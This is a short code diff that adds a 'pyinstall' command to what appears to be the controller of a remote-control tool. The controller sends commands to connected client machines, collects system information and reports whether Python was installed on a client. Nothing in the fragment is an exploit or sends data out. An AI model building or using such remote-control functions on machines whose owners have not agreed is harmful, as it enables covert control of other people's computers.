@@ -384,6 +384,14 @@ while True:
                         else:
                             print(commandResult)
 
+                    elif command == 'pyinstall':
+                        CONNECTIONS[CONNECTION_ADDR].sendall(getMsgWithDataSplit('pyinstall'))
+                        result = recvall(CONNECTIONS[CONNECTION_ADDR])
+                        if result == 'ERROR':
+                            print('FAILED TO INSTALL PYTHON ON CLIENT!')
+                        else:
+                            print('PYTHON SUCCESSFULLY INSTALLED ON CLIENT')
+
                     elif command == 'sysinfo':
                         CONNECTIONS[CONNECTION_ADDR].sendall(getMsgWithDataSplit('sysinfo'))
                         sysInfo = recvall(CONNECTIONS[CONNECTION_ADDR])
